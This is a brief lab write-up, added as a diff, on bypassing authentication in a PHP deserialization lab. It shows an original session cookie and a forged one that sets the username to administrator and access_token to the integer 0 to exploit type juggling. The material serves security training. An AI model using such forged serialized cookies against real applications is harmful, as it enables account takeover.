@@ -1,0 +1,29 @@
+This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. 
+To solve the lab, edit the serialized object in the session cookie to access the administrator account. 
+Then, delete the user carlos.
+
+
+
+the lab gives the cookie:
+Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJuNTN5MXBwdWZteTdpNGh3d25kYXY1emtnZXpnbDgxNyI7fQ%3d%3d
+
+this is a base64 encdoded PHP object.
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"n53y1ppufmy7i4hwwndav5zkgezgl817";}%3d%3d
+
+
+
+changing the request to this:
+Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
+
+decoded:
+O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
+
+
+
+in this new php object here we change the following:
+
+-   username to administrator which requires changing the string length to 13
+
+-   access_token variable type to an integer
+
+-   took the quotes away from the zero to make it an integer
